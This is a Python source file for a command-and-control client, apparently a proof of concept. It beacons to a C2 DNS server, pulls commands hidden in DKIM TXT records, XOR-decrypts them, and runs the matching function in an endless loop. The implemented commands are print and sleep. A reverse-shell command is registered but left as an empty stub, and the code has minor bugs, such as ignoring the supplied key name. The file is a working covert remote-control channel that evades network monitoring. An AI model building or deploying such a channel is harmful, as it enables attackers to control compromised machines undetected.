#!/usr/bin/python
# -*- coding: utf8 -*-

import argparse
import sys
import base64
import time
import re
import dns
import dns.resolver


class DNSResolverError(Exception):
    def __init__(self, msg):
        super().__init__(msg)


class DNSResolver:
    """ DNS Resolver OOP implementation

        :param c2_ip: IP address of the C2 server
    """

    def __init__(self, c2_ip):
        self.c2_ip = c2_ip
        self._resolver = dns.resolver.Resolver()
        self.__user_agent = 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.10) Gecko/2009042316 ' \
                            'Firefox/3.0.10 '

    @property
    def resolver(self):
        return self._resolver

    def _query_dns_by_type(self, domain: str, r_type: str, timeout: float) -> 'DNS Answer':
        """ Send a DNS query for a given domain, asking for an specific type of records and returning
            if timeout exceeds. It also checks the cache to check for already requested queries.
            :param domain: Domain to query for.
            :param r_type: Query type.
            :param timeout: Timeout to wait for the response.
        """

        domain = domain.lower()
        r_type = r_type.upper()

        # If non valid request type
        if r_type not in ['A', 'AAAA', 'ALIAS', 'MX', 'NS', 'SOA', 'SRV', 'TXT', 'PTR', 'CNAME']:
            raise DNSResolverError('Cannot do a DNS request of "{}": Invalid type'.format(r_type))

        # Set parameters
        self.resolver.nameservers = [self.c2_ip]
        self.resolver.timeout = timeout
        self.resolver.lifetime = timeout

        try:
            print('[*] Querying DNS {} records from {}'.format(r_type, domain))
            return self.resolver.query(domain, r_type)
        except (dns.resolver.NXDOMAIN, dns.exception.Timeout):
            return None

    def query_DKIM_record(self, key_name: str, domain: str):
        """ Get the DKIM record information by doing a TXT DNS query to the C" server IP address
        """

        # Get TXT records by querying default._domainkey subdomain of the C2 domain.
        txt_records = self._query_dns_by_type('{}._domainkey.{}'.format(key_name, domain), 'TXT', 5)

        # Get every record decoded with UTF-8
        if txt_records:
            return [j for x in txt_records for j in list(map(lambda k: k.decode('utf-8'), x.strings))]
        return []


class Client:
    """ Simple implementation of a C2 client acting as a DNS requester that receives
    information via a DKIM records.

        :param c2s_ip: C2 server IP address
        :param target_domain: Domain to ask for
        :param key_name: Client key name

    Attributes:
        resolver: DNS resolver
        function_reference: Function enumeration and information that corresponds with the one on the server side
        key_name: Key name that identifies the client on the C2 side
    """

    ASCII_VALUE_CHAR = {x: chr(x) for x in range(0, 128)}
    PK_REGEX = re.compile('p=(.*);')

    def __init__(self, c2s_ip: str, target_domain: str, key_name: str):
        self.c2s_ip = c2s_ip
        self.target_domain = target_domain
        self.key_name = key_name
        self.resolver = DNSResolver(c2s_ip)
        self.function_reference = {
            1: {
                'name': 'Print',
                'params': '*args',
                'callback': self.c2c_print
            },
            2: {
                'name': 'Reverse shell',
                'params': 2,
                'callback': self.c2c_reverse_shell
            },
            3: {
                'name': 'Sleep',
                'params': 1,
                'callback': self.c2c_sleep
            },

        }
        self.key_name = 'alice'

    @property
    def port(self, p):
        return self._port

    @port.setter
    def port(self, v):
        self._port = v

        # Assert port value
        assert 1 <= v <= 65535

    @staticmethod
    def decode(pk: str):
        """ Applies the algorithm described in the repository to decipher and decode a given Public Key
        from the DNS DKIM TXT record.

        :param pk: Public decodable key
        :return: Public key
        """

        # Decode from base64
        pk = base64.b64decode(pk).decode('utf8')

        # Function number is the reversed de-hexed value from the first two characters
        function_number = int(pk[0:2][::-1], 16)
        # The separator character is the ascii value of the third and forth ascii values combined
        separator = Client.ASCII_VALUE_CHAR[ord(pk[2]) + ord(pk[3])]
        # Evaluable_length are the fifth and sixth ascii values combined
        evaluable_length = ord(pk[4]) + ord(pk[5])
        # Calculate the number of characters to decrypt
        to_decrypt = pk[6:6 + evaluable_length]
        # The key is the rest of the characters
        key = pk[6 + evaluable_length:]

        print('[+] Function number:{}'.format(function_number))
        print("[+] Separator: {}".format(repr(separator)))
        print('[+] Evaluable information length: {}'.format(evaluable_length))
        print('[+] Key:{}'.format(repr(key)))

        # If length of the key is greater that the text to decrypt
        if len(key) > len(to_decrypt):
            # Get only the needd length
            aux = key[0:len(to_decrypt)]
        # If key is shorter, take the key as many times as needed plus the characters to fill the decryption text
        elif len(to_decrypt) > len(key):
            number_of_repetitions = len(to_decrypt) // len(key)
            number_of_partial_repetitions = len(to_decrypt) % len(key)
            aux = key * number_of_repetitions + key[0:number_of_partial_repetitions]
        else:
            # If equal, leave the key as such
            aux = key

        # XOR decrypt
        decrypted_text = ''.join([chr(ord(a) ^ ord(b)) for (a, b) in zip(to_decrypt, aux)])

        # Split by the separator (There should only be used as a separator, other characters included on the
        # parameters themselves are excluded.
        params = decrypted_text.split(separator)

        print('{} params:\n-{}'.format(len(params), '\n-'.join(params)))
        return function_number, params

    def c2c_print(self, *args):
        """ Print function from the C2 client
        """
        print(' '.join(args))

    def c2c_sleep(self, seconds):
        """ Sleep function from the C2 client
        """
        time.sleep(seconds)

    def c2c_reverse_shell(self):
        """ Reverse shell function from the C2 client
        """
        pass

    def _ask_and_execute(self):
        """ Single asking loop iteration
        """
        dkim_records = self.resolver.query_DKIM_record(self.key_name, self.target_domain)

        if dkim_records:
            for i in dkim_records:
                # Get the PK
                to_decode = Client.PK_REGEX.search(i).group(1)
                # Parse it
                function_number, params = self.decode(to_decode)
                # Execute the function by number and pass arguments
                self.function_reference[function_number]['callback'](*params)
        else:
            print('[!] No DKIM records for me ;(')

        time.sleep(2)

    def ask_forever(self):
        """ Infinite loop that asks the C2 server which commands to execute by sending DNS requests
        """
        while True:
            try:
                self._ask_and_execute()
            except KeyboardInterrupt:
                print('[!] Halted')
                sys.exit(-1)


if __name__ == '__main__':

    parser = argparse.ArgumentParser()

    parser.add_argument('server_ip',
                        help="C2 DNS server IP Address (might be the same as the C2 server or not.",
                        type=str)
    parser.add_argument('-k', '--keyname',
                        help='Client key name that identifies it on the server side. Default is "alice"',
                        type=str,
                        default="alice",
                        dest='keyname',
                        required=False)
    parser.add_argument('-d', '--domain',
                        help='Domain to resolve. Default "test.com"',
                        default="test.com",
                        type=str,
                        dest='domain',
                        required=False)

    arguments = vars(parser.parse_args())

    Client(arguments['server_ip'], arguments['domain'], arguments['keyname']).ask_forever()
